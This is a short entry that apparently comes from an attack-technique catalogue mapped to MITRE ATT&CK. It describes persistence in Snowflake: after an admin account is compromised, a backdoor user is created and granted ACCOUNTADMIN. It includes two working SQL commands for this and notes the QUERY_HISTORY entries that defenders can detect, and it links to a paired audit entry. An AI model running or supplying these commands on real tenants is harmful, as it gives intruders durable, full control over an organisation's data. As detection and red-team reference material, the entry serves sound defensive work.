---
id: snowflake-rogue-user
title: Snowflake backdoor user + ACCOUNTADMIN grant
section: Snowflake / data cloud
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1136.003]
platform: [snowflake]
source: Snowflake tenant persistence (rogue user / role grant)
pair: snowflake-user-audit
---

After compromising an admin, create your own user and grant it **ACCOUNTADMIN** — a
durable, full-tenant login that survives the victim's password reset and blends in among
service users. Snowflake records the creation as `QUERY_TYPE = CREATE_USER` and the grant
as a `GRANT` carrying `ACCOUNTADMIN` in `QUERY_HISTORY`. (Data cloud — no slots.)

```sql
-- create a backdoor user and grant it full-tenant admin
CREATE USER bd PASSWORD = '<pw>' MUST_CHANGE_PASSWORD = FALSE;
GRANT ROLE ACCOUNTADMIN TO USER bd;
```
